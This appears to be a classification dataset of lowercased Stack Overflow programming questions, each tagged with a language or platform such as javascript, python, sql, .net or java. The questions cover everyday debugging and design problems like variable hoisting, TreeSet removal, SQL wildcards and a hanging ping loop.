am i executing the command with switches wrong  or is the code broken in officetopdf   i downloaded <a href= https://github.com/cognidox/officetopdf/releases/tag/release-1.8  rel= nofollow noreferrer >officetopdf.exe</a> to convert some docm files into pdf. i can do that with the following command. <code>officetopdf asd.docm out.pdf</code> here is the link for <a href= https://github.com/cognidox/officetopdf#command-line-switches  rel= nofollow noreferrer >documentation</a> on command line switch options.    as soon as i am trying to add any command switches  the command doesn t work and returns this    <blockquote>    input file can not be handled. must be word  powerpoint  excel  outlook  publisher or visio  </blockquote>   examples i tried:   <pre><code>officetopdf /verbose asd.docm out.pdf officetopdf /bookmarks /hidden /readonly asd.docm out.pdf </code></pre>   first command was my main goal as starters  but no matter in which order do i put in the command it sends the same invalid input message. second command was literally copied from documentation.

where did i make a javascript error in this short section of code   i have made a short demo of a javascript problem.  when the submit button is clicked  the alert pops up informing the user that a blank value is not allowed  which is good.  but then the page submits anyways  which is bad.    it seems this behavior is only happending on hidden fields.    (its more clear if you enter any value into the name field. click submit. i know the page submits because the value in name clears out.)    can anyone see what is wrong here    <pre><code>&lt;html&gt; &lt;body&gt;  &lt;form action=   method= post  name= form  onsubmit= return validate() &gt;  name: &lt;input type= text  name= name  id= name &gt;  &lt;br&gt;&lt;br&gt;signature: hidden &lt;input type= hidden  name= poa_esign_signature  id= poa_esign_signature &gt;  &lt;br&gt;&lt;br&gt;&lt;button type= submit &gt;sign&lt;/button&gt;  &lt;/form&gt;  &lt;script type= text/javascript &gt; function validate() {   var element=document.getelementbyid( poa_esign_signature );   if (element.value==  ) {     alert( signature may not be blank. );     element.focus();     return false;   } } &lt;/script&gt;  &lt;/body&gt; &lt;/html&gt; </code></pre>,javascript
is there any reason to build a website so that it can run with javascript disabled anymore   for the longest time  one of the basic technical requirements for website projects i ve worked on was that the site should run with javascript disabled.    it actually caused a great design by-product: concerns were nicely separated between basic functionality and user-experience improvements.  beyond that  i don t know of any reason to do so anymore.    assuming that i m targeting the widest user base possible  are there any reasons not to make javascript required,javascript
difference between the different versions of .net  i checked what version of microsoft s .net platform i have  and i saw that it is 4.0. i know there are newer versions. i found a book about wpf applications but it is explained how to write the apps on c# .net 4.5. now  does that mean that i can t write and test the examples of the book   and for example if i write an application on .net 4.5  but user s computer has 4.0 version  will he be able to run this app,.net

sql server tool that allows navigating through key relationships  does anyone have a knowledge of a tool that allows to <strong>navigate over reliationships</strong> between entities in <strong>sql server database </strong>  i want to be able to list all rows in a table and then (for selected row) jump to all rows that match (in a context of relation between tables). the same thing can be done in <strong>linq to sql</strong> by querying <strong>navigation properties</strong> but it s not convinient to do this in code all the time. i tried to use <strong>linqpad</strong> but query results are not interactive in this way - again it can be done in code.    thanks for answers in advance:),sql

why does not a remove call to this treeset effectively removes the element   i was trying earlier to code a dijkstra algorithm and faced out a problem with my implementation. i finally found a solultion but am still puzzled with the behaviour of the code.    what i am trying to do here is to iteratively <em>mark</em> the elements of a tree set. everytime i mark an element  i remove it from the set and reinsert it  so the set places it at the end of the set (as the <em>compareto</em> method tells it to do). doing so  i can take the first element of the set inside a <em>while</em> loop and stop when this first element is <em>marked</em>.    the following example is a minimal example:   <pre><code>public static void main(final string[] args) {     set&lt;element&gt; elements = new treeset&lt;&gt;();     elements.add(new element(1));     elements.add(new element(2));     elements.add(new element(3));     elements.add(new element(5));     elements.add(new element(4));     system.err.println(elements.size());     while(!elements.iterator().next().mark){         element element = elements.iterator().next();         element.mark();         elements.remove(element);         elements.add(element);     }     system.err.println(elements.size()); }  private static class element implements comparable&lt;element&gt;{      private boolean mark = false;     private final int id;      public element(int id){         this.id = id;     }      public void mark(){         this.mark = true;     }      @override     public boolean equals(object o){         element other = (element) o;         if(this.mark == other.mark){             return this.id == other.id;         } else {             return false;         }     }      @override     public int compareto(element other){         if(this.mark == other.mark){             return this.id - other.id;         } else if(this.mark &amp;&amp; !other.mark){             return 1;         } else {             return -1;         }     } } </code></pre>   the problem here is that the line :   <pre><code>elements.remove(element); </code></pre>   does <strong>not</strong> remove the element. however  running it in a debugger  i can see that the element has the exact same reference as the element in the set and is equal to it with respect to the <em>equals</em> method. so  when running the line :   <pre><code>elements.add(element); </code></pre>   the same element is added two times ; because i suppose that the insertion in a tree set uses a binary search and does not test the equality between the first element of the set and the newly inserted one.    i have understood that swapping the two lines :   <pre><code>element.mark(); elements.remove(element); </code></pre>   actually solves the problem.    my question though is : why does a modified element of a tree set is not effectively removed when modified through an iterator,java

.net runtime 2.0 error  i keep on getting .net runtime 2.0 errors (reported in the event log) on my test machines  i tend to get these when swapping assemblies out for those with more debugging / diagnostic information (or fixes). an example message:   <pre><code>faulting application myapp.exe  version 1.0.0.66  stamp 4a3851fa  faulting module kernel32.dll  version 5.2.3790.4480  stamp 49c51f0a  debug  0  fault address 0x0000bef7. </code></pre>   my guess is that even though i m careful not to alter the interface  swapping assemblies in this way is probaly something i shouldnt be doing (should i be doing this )    all the same  the instalation / build process for this app is hefty  and its a massive pain to rebuild and reinstall everything when debugging problems (in fact its just not fesable). is there any way to get any more useful information out of these sorts of errors,.net
where do you store long/complete queries used in code   here s my situation. i ve noticed that code gets harder to maintain when you keep embedding queries in every function that will use them. some queries tend to grow very fast and tend to lose readability after concatenating every line. another issue that comes with all of the concatenation is when you must test a specific query and paste it. you are forced to remove all of the   that held your query string together.    so my question is  what methods are being used to separate queries from the code  i have tried searching but it doesn t look like it s the right thing because i m not finding anything relevant.    i d like to note that views and stored procedure are not possible since my queries fetch data from a production database.    thank you.,sql

why can t i invoke a function directly   i am working through a small exercise from code school and cant figure out why i have to pass the function <code>buildticket(parkrides  fastpassqueue  wantsride);</code> to a variable and then invoke the function on the variable to make this script work.    the code below will not execute (i don t assign the function to a variable):   <pre><code>var parkrides = [     [ birch bumpers   40]      [ pines plunge   55]      [ cedar coaster   20]      [ ferris wheel   90] ];  var fastpassqueue = [ cedar coaster    pines plunge    birch bumpers    pines plunge ];  var wantsride =  birch bumpers ;  function buildticket(allrides  passrides  pick) {     if(passrides[0]==pick){         var pass = passrides.shift();         return function(){             alert( quick you have a fast pass to  +pass+ ! );         };     } else {         for(var i = 0; i&lt;allrides.length; i++){             if(allrides[i][0] == pick){                 return function (){                     alert( a ticket is printing for  +pick+ !\n +                            your wait time is about  +allrides[i][1]+  minutes. );                 };             }         }     } }  buildticket(parkrides  fastpassqueue  wantsride); </code></pre>   but if i add <code>var ticket = buildticket(parkrides  fastpassqueue  wantsride);  ticket();</code> it works properly.   full code below:   <pre><code>var parkrides = [     [ birch bumpers   40]      [ pines plunge   55]      [ cedar coaster   20]      [ ferris wheel   90] ];  var fastpassqueue = [ cedar coaster    pines plunge    birch bumpers    pines plunge ];  var wantsride =  birch bumpers ;  function buildticket(allrides  passrides  pick){     if(passrides[0]==pick) {         var pass = passrides.shift();         return function(){             alert( quick you have a fast pass to  +pass+ ! );         };     } else {         for(var i = 0; i&lt;allrides.length; i++){             if(allrides[i][0] == pick){                 return function (){                     alert( a ticket is printing for  +pick+ !\n +                            your wait time is about  +allrides[i][1]+  minutes. );                 };             }         }     } }  var ticket = buildticket(parkrides  fastpassqueue  wantsride);  ticket(); </code></pre>   any insight as to why i need to pass the function to a variable and then call the variable would be greatly appreciated.   i am sure i am missing the obvious here.,javascript

creating a python game  dealing with lists  so i m creating a very basic python game and i need some help with this step i m stuck at.  the concept of the game is for the program to roll two die and add the sums.  with that number they can choose a number available from the number list (1-10) to  peg .  they keep going until all numbers are pegged or are out of options.  earlier in the program i created two functions that i m using in this step.  those two are ask_number and valid_moves.  basically the ask number just asks them which number they want to peg but it doesn t actually peg the number yet.  the valid_moves function just checks which numbers are still available for the player to select.      the game pretty much just looks like this halfway through:   <pre> ------------------------------ (1)(2)(3)(4)(x)(6)(7)(x)(9)(x) ------------------------------ </pre>   the x are the numbers that were already pegged.  in this part of the game i need to figure out how to replace the number with  x .  i have this so far but i know i am way off and i am having trouble with figuring out what to do.  (pegholes is the name of the list and move is the number they picked in the ask_number function).  thanks so much!   <pre><code>pegged =  x   def enter_peg(pegholes  roll  total):     ask_number()     if ask_number == valid_moves():         pegholes.append(ask_number(pegged))          return pegholes  move </code></pre>,python

ping command doesn t return when pinging a remote server that is down  i have a function in a python script that basically checks whether a remote server is up or not using ping. if it is not up then it should wait till it is up and only then return. but the script doesn t return if the remote server is down  if the remote server is up then the script returns.    i have tried both subprocess and os.system  i also tried with various parameters in ping command like -c  -w and -w but nothing seems to help. any ideas on what i might be doing wrong     here is the code:   <pre><code>def waittillup():     command =  ping -c 1 -w 2   + remoteserver     response = os.system(command)      if response == 0:         print  up\n      else:         print  down\n              args = shlex.split(command)     p = subprocess.popen(args  stdout=subprocess.pipe  stderr=subprocess.pipe)     output  err = p.communicate()     logging.debug( waiting for the remote server to be up )     while  4 packets transmitted  4 received  not in output:         logging.debug( waiting for the remoteserver to be up )         p = subprocess.popen(args  stdout=subprocess.pipe)         output  err = p.communicate()         </code></pre>   ideally it should loop till it is up but just for the sake of checking whether it is returning or not i have just put an if else condition. when the remote server does actually come up  the script is still stuck and not stopping. once i hit an enter in the window  it returns. any suggestions are welcome.    update# 2    right now i am just trying to do this  not checking for any response or anything. i just hope to let the program fall through to main and then end of program but it is not even doing that.   <pre><code>def waittillup():     command =  ping -c 1   + params.storagearray         response = os.system(command) </code></pre>   i am using lot of subprocess.popen calls one after the other  so is it possible that some buffer is not getting cleared or something of similar sort  can this be the reason for the weird behavior     update# 3    the problem is probably in the reboot call of the remote server before the code that i have pasted. i changed few things and realized that at the function where i am trying to do a reboot  at that point the function is not returning.     this is the complete code. with logging statements i am able to determine that the call for reboot  below marked as the  culprit call  is the point where the execution is getting stuck and doesn t proceed till it gets a enter key from the user.   <pre><code>def waittillup():     command =  ping -c 1   + remoteserver     response = os.system(command)  def execcmd(op  command):     logging.info( executing %s operation(command: %s)  %(op  command))     args = shlex.split(command)     sys.stdout.flush()     p = subprocess.popen(args  stdout=subprocess.pipe)     output  err = p.communicate()     logging.debug( output of %s operation: %s  %(op  output))  def install():           execcmd( chmod    ssh root@  + remoteserver +   chmod +x ~/os*.bin )     execcmd( reboot    ssh root@  + remoteserver  +   reboot -nf ) ### culprit call     waittillup()  def main():     install() </code></pre>,python

python - sys.stderr not getting saved to .txt or .log  i was checking the working of standard streams  and currently i am working with <code>stderr</code> using python. to explain clearly  the following is my code:   <pre><code>print( python ) testt() </code></pre>   when i run the code i get the following:   <pre><code>python traceback (most recent call last): file  c:/python34/s3.py   line 5  in &lt;module&gt; testt() nameerror: name  testt  is not defined </code></pre>   now i wanted to save the error message to a text file  so my code for that was as follows:   <pre><code>import sys  sys.stderr = open( err.txt    w ) # i tried with  err.log  also print( python ) testt()  sys.stderr.close() sys.stderr = sys.__stderr__ </code></pre>   now when i run the program  the error is not being displayed in the python shell. it is not getting saved to the <code>err.txt</code> file also.     when i checked the <code>err.txt</code> file properties it shows that the file has been modified recently (i.e. the time when the program was run)  but the file is blank. what might be the problem  i am using windows and python 3.4.   <hr>   i installed python 3.5 and still get the same issue. i also tried using contextlib  but still unsuccessful. my modified code using <code>contextlib</code> is as follows:   <pre><code>from contextlib import redirect_stdout  redirect_stderr  with open( c:/users/jeri_dabba/desktop/shortcutz/test/outfile.txt    w ) as file  redirect_stdout(file):     help(pow)  with open( c:/users/jeri_dabba/desktop/shortcutz/test/errfile.log    a ) as file1  redirect_stderr(file1):     testt() </code></pre>   <code>redirect_stdout(file)</code> was working fine  it was saving the output to the file; whereas <code>redirect_stderr(file1)</code> is not saving the <code>stderr</code> to the file.     what might be the problem,python
interact with file browser window using javascript  when uploading files to a website you will usually press an upload button which opens up the file browser of the os you are using. i have a series of automated selenium tests that runs remotely. because i m running the tests remotely i need to do everything through selenium. one of the ways i m able to interact with the browser in selenium is by executing javascripts. is it possible to create a javascript that will write in the path of the file and then hit enter (or click on ok)  or is javascript only able to interact with objects in the browser,javascript

java - how to get dependencies to ignore each other   we are developing a fairly large project and have many dependencies.  recently  we ran into an issue with a conflict between two of them  agileapi.jar and axis.jar.  both are 3rd party libraries.    the code in question depends directly on agileapi.jar.  if i build it with just that in the build path  everything that depends on it works correctly.      as soon as i add axis.jar to the build path (just adding it  not writing code that depends on it)  everything goes wrong.  some of the code that depended on the first library is now throwing exceptions from the 2nd library.  it is as if the first library is picking and choosing methods to call from the 2nd library  instead of whereever it was calling them from prior.    i have code in the project that needs axis.jar directly  so i can t just remove it from the build path.  i need to find a way to have these two exist in the same build path  but ignore each other.    it should be noted that both libraries coexisted prior to a recent upgrade with agile.  i have been working with oracle s support team to try and resolve this.  after two weeks  though  i am looking for other sources of help.    our environment is windows and eclipse  although in testing this  it also occurs when running java from a command line.  our jdk is 1.5.0_22.    any help would be appreciated.    thank you     david    edit:    as requested  here are the stack traces that we see.  the first stack trace is printed in the code beyond my control:

how to avoid nested try-s of increasing complexity/indentation in python  i have code like this:   <pre><code>try:     request=parse_request except:     print  cannot parse your malformed request      exit() else:     try:         fh=a_factory_function()     except:         print  cannot create object      else:         if request[ operation ]== search :             pass         elif request[ operation ]== more_like_this :             pass         elif request[ operation ]== list_files :             pass         elif request[ operation ]== update :             pass         else:             print  unsupported operation  </code></pre>   in present form it has two levels of indentation   <ol> <li>parse a request</li> <li>the factory function to generate an object to process the request</li> </ol>   i can easily imagine this getting to 4 levels and becoming too complex for our puny reasoning. is there a pythonic way to flatten the indentation and make it  linear,python

sql  ranges  and wildcards  complete sql noob here.   trying to think about a way to store some data in a table that looks a little like this:  <blockquote>  &quot;0-15&quot;  &quot;low&quot;  &quot;1-3&quot;   &quot;45-50&quot;  &quot;med&quot;  &quot;*&quot;   &quot;*&quot;  &quot;*&quot;  &quot;1000&quot;  </blockquote>  where column 1 &amp; 3 are ranges of integers  and col 2 is an enumerated type (could be stored as whatever really).   i want to be able to put in wildcards in the table to keep the number of rows down while still not &quot;missing&quot; anything.   from what i understand it  column 1 &amp; 3 would be best stored as two columns of integers each  with -int_max to int_max or whatever as a &quot;wildcard&quot;. (select bla from bla where col1.1 &gt; val and col1.2 &lt; val)   is this a reasonable strategy    column 2 seems trickier  select bla from bla where col2 =  med  or col2 = *  doesn t seem right. i could probably do these numerically just like 1 &amp; 3 but would rather not   anyone care to enlighten me,sql

is there an easier way to select specific parts of a column   i am working on homework for class and one of the questions is:    create a query that will show the item id  size  max and min price for all those items that have a size of large  extra  large or extra extra large.  before writing this query make sure you know how the size data is stored.  sort your output by size.    i tried this way  but it had xxxl so i couldn t use it:   <pre><code>select itemid         size         maxprice         minprice from   item where  size like   l          or size like  %xl  order by size </code></pre>   then i tried this way and got the results i needed  but i feel like this is a lazy way for some reason and a little to long:   <pre><code>select itemid         size         maxprice         minprice from   item where  size like   l          or size like  xl          or size like  xxl  order by size </code></pre>   so is there a way i can make the query simpler and select what i m looking for or no,sql
is it a good idea to use a trigger to record a time a row is updated   i hate triggers. i ve been tripped up by them way too many times. but i d like to know if it s a better to specify the time every time a row is updated or let a trigger take care of it to keep code to a minimum     just to clarify  the table the trigger would be on would have a column called something like <code>lastmodified</code>    the particular scenario i m dealing with is i am one of the developers who uses a database with about 400 stored procedures. there are about 20 tables that would have this <code>lastmodified</code> column. these tables would be updated by about 10 different stored procedures each.,sql

looping a rock-paper-scissors game  ok so this should be fairly easy to answer but for some reason im having an issue.( could be because im very new to programming) i ve created a rock papers scissors game against the cpu. now i want to ask the user if they want to play again and if they answer y then it should go through the loop each time. if they type  n  then the game will end. the main issue im having is that once you type in y to play again it just gives you the result from the last game. any pointers would help.     here is what i have :    <pre><code>var userchoice =   ; var userchoice = prompt( choose rock  paper  or scissors ); var playagain =  y ; var computerchoice = math.random();  if (computerchoice &lt; 0.34) {     computerchoice =  rock ; } else if (computerchoice &lt;= 0.67) {     computerchoice =  paper ; } else {     computerchoice =  scissors ; }  choice1 = userchoice; choice2 = computerchoice;  while (playagain ==  y ) {     function compare(choice1  choice2) {          if (choice1 == choice2) {             return ( it s a tie! );         }         if (choice1 ==  rock ) {             if (choice2 ==  scissors ) {                 return ( you win! );              } else {                 return ( computer wins! );             }         }         if (choice1 ==  paper ) {             if (choice2 ==  rock ) {                 return ( you win! );             } else {                 return ( computer wins! );             }         }         if (choice1 ==  scissors ) {             if (choice2 ==  rock ) {                 return ( computer wins! );             } else {                 return ( you win! );             }         }     }      document.write(compare(choice1  choice2));     document.write( &lt;br&gt; );     playagain = prompt( do you want to play again  y or n );     userchoice = prompt( choose rock  paper  or scissors ); } </code></pre>,javascript

.net windows application - how to automatically call a program by file association  i have a windows .net program that (among other things) will display image files.  these can be in either tiff or pdf format  and at the moment the way they are displayed is to see what the file extension is  then to call the appropriate program to display that file.    here s the code fragment:   <pre><code>            imagepath = imagedataset.tables( table ).rows(imagecal).item(2)         imagepath =  \\tylerimaging\documentupload\  &amp; imagedataset.tables( table ).rows(imagecal).item(3) &amp;  \  &amp; imagedataset.tables( table ).rows(imagecal).item(4)         dim pdfimage as string = imagepath.substring(imagepath.length - 3)         if ucase(pdfimage) =  pdf  then             system.diagnostics.process.start( acrord32.exe   imagepath)         else             try                 system.diagnostics.process.start( mspview.exe   imagepath)             catch ex as exception                 if ex.message =  the system cannot find the file specified  then                     system.diagnostics.process.start( ois.exe   imagepath)                 end if             end try         end if     end if </code></pre>   now  the problem is that if someone doesn t have the acrobat reader installed  for example  but the full version of adobe acrobat  the process.start for acrord32.exe will fail.  but  windows clearly has the association between the file type of pdf and acrobat - so  here s my question - how can i get the file displayed by whatever program is associated with that file type in windows     thanks in advance....,.net

how to use .net geocoordinatewatcher to get only locations from gps(gnss) devices   i have a bluetooth connected nmea device that can output a position every 1 tenth of a second. i also have another usb connected device that can output a position every second.    the issue is that the .net location service uses all possible means of geotagging  diluting the precision of the gnss device  outputting positions at random times and/or deceiving the user that it is connected to a gnss device.    if i go completely offline (no internet  no wifi  no cell reception) and delete location history  it seems to work fine. this is though not a solution for me  as the app will not only be used by me  and it is a huge inconvenience anyway to go through all this  only to achieve something that should be achievable by software means. moreover  using the app with any other location service than gps (gnss) location is useless.    is there any way that i can use <code>system.device.location.geocoordinatewatcher</code> to get only gps (gnss) positions,.net

the correct way to approach polymorphism in this case (java)  i have been given a task that can be simplified to this scenario:    customers need to order boxes and these boxes can come in different sizes  the different sizes can be ordered in certain colours (but not all colours) and have different qualities (but not all qualities).    now i believe the best way to approach this would be to make the box class the abstract class and have the different boxes extend the box class to prevent repetitive code  but then the issue comes in  how do i check an order a client puts in is valid without storing static variables in the class (this class cannot have this colour etc.)     my solution is to simply put static variables in each extension of the class and then check each class without initialising a new object but it means having repeating variable declarations in each class.    any help is appreciated.,java

java hashmap<string  set<int>> losing set elements after they re added  the purpose of the following code is to take in a title from one book at a time  split it into keywords (anything separated by a space) and map the resulting keywords into a hashmap containing the keyword as the index and a set of integers (representing the position of the book in an arraylist arrayofreferences).   <pre><code>set&lt;integer&gt; toadd = new hashset&lt;integer&gt;(); for (string keyword : addtitle.split(   )) {     toadd.clear();     if (!searchmap.containskey(keyword.tolowercase())) {         if (!toadd.contains(arrayofreferences.indexof(newbook))) {             toadd.add(arrayofreferences.indexof(newbook));             searchmap.put(keyword.tolowercase()  toadd);             system.out.println( new flag:   + keyword +     + searchmap.get(keyword.tolowercase()));         }     }     else     {         for (integer addnum : searchmap.get(keyword.tolowercase())) {             toadd.add(addnum);         }          system.out.println( before:   + keyword +     + toadd);         if (!toadd.contains(arrayofreferences.indexof(newbook))) {             toadd.add(arrayofreferences.indexof(newbook));             searchmap.put(keyword.tolowercase()  toadd);         }         system.out.println( after:   + keyword +     + searchmap.get(keyword.tolowercase()));     } } </code></pre>   currently the code adds the respective indicies to the hashmap  adds the additional positions to the list and then loses the previous values in the list. i m still very new to java so the problem could be staring me right in the face  however i need a fresh pair of eyes on it.     any help is greatly appreaciated!,java
javascript- variable hoisting  this is a simple snippet  i just dont understand something.    the below code outputs 12  i understand that  because the <code>var foo = 12;</code> replaces the previous declaration of the variable.   <pre><code>&lt;script&gt; var foo = 1; function bar(){   if (!foo) {     var foo = 12;   }   alert(foo); } bar(); &lt;/script&gt; </code></pre>   in the below code  it alerts <strong>1</strong>   which means the variable declared outside the function is accessible inside the function.   <pre><code>  &lt;script&gt;     var foo = 1;     function bar(){       alert(foo);     }     bar();     &lt;/script&gt; </code></pre>   but  in the below code  why it alerts undefined    i thought  it will alert <strong>1</strong>   i am just assigning the previously declared variable to the new one.   <pre><code>  &lt;script&gt;     var foo = 1;     function bar(){       if (!foo) {         var foo = foo;       }       alert(foo);     }     bar();     &lt;/script&gt; </code></pre>,javascript

creating a function like isdigit() in python  please don t give me the answer just point me in the right direction  thank you. also  i need to do this without <code>isdigit()</code>.    i am trying to create a program that checks all the characters of a string and if any of them are not natural numbers then the program will return <code>false</code> otherwise it will return <code>true</code>.    this is what i have so far:   <pre><code>numbers = [ 0123456789 ]  if len(str) &gt; 0:     for i in str:         if i not in numbers:             return false         else:             return true </code></pre>   i have a few test cases and the problem i m having is that when i return  the whole program just ends. i need to find a way to include the <code>else: return true</code>,python

in python  how can i use an attribute as both and attribute and a method/callable   this is kindof an experiment. i m interested in an api that supports both of these syntaxes:   <pre><code>obj.thing </code></pre>   --> returns default value   <pre><code>obj.thing(2   a ) </code></pre>   --> returns value derived from *args and **kwargs     <code>thing</code>  is the same object in both cases; i d like the calling of thing to be optional (or implicit  if there are not () after it).    i tried over-riding __repr__  but that s just the visual representation of the the object itself  and what is <em>actually returned</em> is an instance of the containing object (here   obj ). so  no good.    i m thinking that there would be an attribute set on an object that was a callable (don t care if it s an instance  a def  or just __call__ on the object) that has enough default values:   <pre><code>class callabledefault(object):     __call__(self  num=3  letter= z ):         return letter * num  class dumbobject(object):     foo = callabledefault()  obj = dumbobject() </code></pre>   so  ideally  doing <code>obj</code> alone would return  zzz   but one could also do <code>obj(7  a )</code> and get  aaaaaaa .    i m thinking decorators might be the way to do this  but i m not great with decorators. one could override the getattr() call on the containing class  but that would mean that it has to be in a containing class that supports this feature.,python
sql multiple query with 1 result set  this is really difficult to explain  but i m going to take a shot.  because it s hard to explain  it s also hard to search for - i have tried  and come up with nothing.    i m trying to write on sql statement  based on result set from two separate queries.    query 1 returns student id  student lname  student fname from table1    query 2 returns student id from table2    i didn t design the db  but the queries have to be separate.  i have no choice there.    the result i want is  to return students from table1 only if their student id does not exist in table2.,sql

javascript redirect or reload  i have an ajax method which submits data over ajax. the server then responds with a url to load. most times the url will be different to the one on which the request was made  but sometimes the url is the same.    either way  i want the page to go to the intended url  even it s just reloading the page.    i ve tried the <code>window.location.href =   </code> method  but if the current url is the same as the intended url  nothing happens.    i ve tried the <code>window.location.replace(url)</code> method  but that doesn t reload the page if current === intended.    i ve tried the <code>window.location.reload(true)</code> method  but that s only good if the current url is the same as the intended url.    i ve tried to compare the intended url to the current url and do either a reload or a <code>href</code> method  but this has problems as well. if i click on a bootstrap tab  the hash doesn t appear in the url  so the <code>current url</code> value is actually incorrect.    for your reference  this is/was my comparison:   <pre><code>if(window.location.href === response.intended) {     window.location.reload(true); } else {     window.location.replace(response.intended); } </code></pre>   all i want to do  is force the browser to redirect to an intended url  or reload the current page depending on current url vs intended url.,javascript
looking for javascript calendar that will embed in a web page and get data from php/mysql server  i ve been hunting for a long time for this  but despite my intuition that this would be a common thing  i haven t encountered anything that meets my requirements.    i just need a month calendar that i can display in a web page which will show events. each event just needs to show the name  and that name will link to another page.    the calendar needs to be large and readable  something in the neighborhood of 600 or 800 pixels wide. i should be able to colour the lines and text and so on with css. should not rely on any image files.    data needs to be pulled from the server via json. i have an existing php/mysql set up on the server side  and i can write the php to accept and send the right json data. i only need the javascript side of things.    the reason i have not found anything like this is because the calendars i have found have fallen into two distinct categories:    one are calendars that are build with the intention of having people interface with the calendar and add  share  or edit events. i strictly only need to display (events in my case are added to the database via a different interface). the amount of code overhead for that kind of interaction makes them way too huge and unweildy to edit down to my needs.    the other type of common javascript calendars are the types used in forms  that are often seen in drop downs  used for picking a single date. these are obviously too small and are in any case too different from what i need to extend to my purposes.    i can edit javascript  but building an entire gregorian calendar with all the little mathmatical tricks to account for days and rows and columns in a table representing a month seems like reinventing a very complicated wheel.    perhaps i am using the wrong search terms or something. are there any existing code bases available that do what i hope to acheive     free and/or open source is of course the ideal  but i will consider purchasing if necessary.,javascript

.net dns.gethostaddresses(domain) - return ipv6 address  i ve searched on this quite a bit and i m still not having any luck. the issue is  if i nslookup from my server  if the host has an ipv6 address  i see it in the list. however  if i use .net system.net s dns.gethostaddresses(domain)  it only returns ipv4 addresses.    with a lot of reading  i found this: ipv6 addresses are filtered from the results of the gethostaddresses method if the local computer does not have ipv6 installed.    i m in an ipv4 only network. i don t need to ping or have actual network connectivity  i only need to return an ipv6 address for a host if it has one  which like i said  works with nslookup from the same server.    could anyone tell me how to get an ipv6 address using .net  even if you happen to be in an ipv4 only network     thanks,.net

i need to send multiple clients a python file and have them all execute it  then download the result  so here s the deal. i have a server that has a ton of clients. i need a way to send them all a python script  and once they receive it they must immediately execute the script.  said script will create a file which i then need to download back to the server. the only thing i have to start with is a file with a list of client ip addresses (though with not too much effort i can change that to be client  names  if that would make the code easier).    as of right now it does not matter whether this is accomplished through post or ftp or any other file transfer service you can think of  the only goal is that it is fast. the script that is being executed on all the clients is a simple key generator  which i can provide if need be.    as said before the main goal of this needs to be speed  any help that can be provided would be appreciated.     im part of a project trying to  map  the internet. i was picked  not because of any sort of networking skills (of which i have none) but because i was the only candidate that knew any python. right now im just trying to establish a connection with all the (1000+) clients we are using and get the ssh (rsa) keys from them. later i will be telling the clients to send traceroutes.    <strong>edit</strong> ---- provided additional information to make the question clearer,python

javascript onblur for multiple fields  i have a table that consists of many text input fields which the user can assign values to. my goal is that if the user  onblur s <strong><em>any</em></strong> of the fields then a function will activate. i could resolve the issue by marking each cell individually  however it would be very repetitive and i m sure there s a more efficient way around this.    to demonstrate:   <pre><code>&lt;table&gt;   &lt;tr&gt;     &lt;td&gt;i&lt;/td&gt;     &lt;td&gt;&lt;input type= text  id= whatever1 &gt;&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;love&lt;/td&gt;     &lt;td&gt;&lt;input type= text  id= whatever2 &gt;&lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;td&gt;stack overflow&lt;/td&gt;     &lt;td&gt;&lt;input type= text  id= whatever3 &gt;&lt;/td&gt;   &lt;/tr&gt; &lt;/table&gt; </code></pre>   with js:   <pre><code>var e1 = document.getelementbyid( whatever1 ); e1.onblur = alias;  function alias()  {     alert( started );    } </code></pre>   and then repeat this for each input box another 2 times. or hopefully there s an easier way.,javascript

most efficient way to write combination and permutation calculator in javascript  i have a math website <a href= http://finitehelp.com  rel= noreferrer >http://finitehelp.com</a> that teaches students finite math. i thought it would be cool to include a calculator so i made one for combinations and permutations in javascript. live calculator is at <a href= http://finitehelp.com/finite-calculator.html  rel= noreferrer >http://finitehelp.com/finite-calculator.html</a>. i know next to nothing about javascript and would venture to guess there is a much more efficient way to write the following particularly because of the excessive use of variables. if someone could please help me i would be very grateful.   <pre><code>&lt;script type= text/javascript &gt; // calculate n! math.factorial = function(n) {     if(typeof n ==  string ) n = number(n);     if(typeof n !=  number  || isnan(n))     {         alert( factorial requires a numeric argument. );         return null;     }     if (n &lt; 2) return 1;     return (n * math.factorial(n-1)); } math.divide = function(a b) {     return a/b; } &lt;/script&gt;  &lt;form class= form  name= combination  action=  &gt;     &lt;p&gt;c(&lt;input type= text  value= n  name= t1  size= 1 &gt; &lt;input type= text  value= r  name= t2  size= 1 &gt;)     &lt;input type= button  value= calculate       onclick= var n = t1.value; var r = t2.value; var n_minus_r = parsefloat(n) - parsefloat(r); var numerator = math.factorial(t1.value); var n_minus_r_fact = math.factorial(n_minus_r); var r_fact = math.factorial(r); var denominator = n_minus_r_fact * r_fact; t3.value = math.divide(numerator denominator); return true; &gt;     = &lt;input type= text  name= t3  size= 12  readonly&gt;&lt;/p&gt; &lt;/form&gt; </code></pre>,javascript

why do labels exist   why do labels exist in javascript   <pre><code>var i = 0;  usefullabel://why do i exist  while(i &lt;= 10){     document.writeln(i);     i++;     if(i &gt; 5)         break;// usefullabel; } </code></pre>  the above code doesn t appear to need a label at all (it works with or without the commented label name).  and considering douglas crockford has not condemned them entirely:   <a href= http://javascript.crockford.com/code.html  rel= nofollow noreferrer >labels</a>  <blockquote>  statement labels are optional. only these statements should be labeled: while  do  for  switch.  </blockquote>  are they ever considered a good practice to implement   to me  these things look eerily close to the infamous goto statement in some languages.,javascript

retrieving only reactivated projects from a history of updates  so i have a table that tracks the updating of a projects status. now each time a project changes status a record of it is inserted into a new row. this table in its simplified form looks like this:   <pre><code>+-----------+------------+--------+ | projectid | updatedate | status | +-----------+------------+--------+ |           |            |        | |           |            |        | |           |            |        | +-----------+------------+--------+ </code></pre>   the possible values for the <code>status</code> column are either:   <ul>  <li>reactivated</li>  <li>closed</li>  <li>pending</li>   <li>active</li> </ul>   now here is where it gets tricky for me at least. i want to be able to select only currently reactivated projects. this logically means that a project that has an existing row with reactivated as its status but <strong>not having the most recent record for that id as a closed status</strong>. thanks for any help on this i am having a hard time visualizing the sql query for this.    <strong>bonus</strong> (for me)    if you could write the query as a create stored procedure that would be awesome.    <strong>update</strong>    bolded the requirements of being reactivated.    <strong>updated update</strong>    some test data   <pre><code>projectid | updatedate   |  status   ----------------------------------- 3566      | 2011-11-09   |  pending  1282      | 2011-11-17   |  reactivated  3351      | 2011-11-17   |  closed   2252      | 2011-11-17   |  reactivated  2252      | 2011-11-17   |  active   </code></pre>   now with this query it should show id s 1282 and 2252 because they both have reactivated in a row and do not have closed as their last updated status.,sql

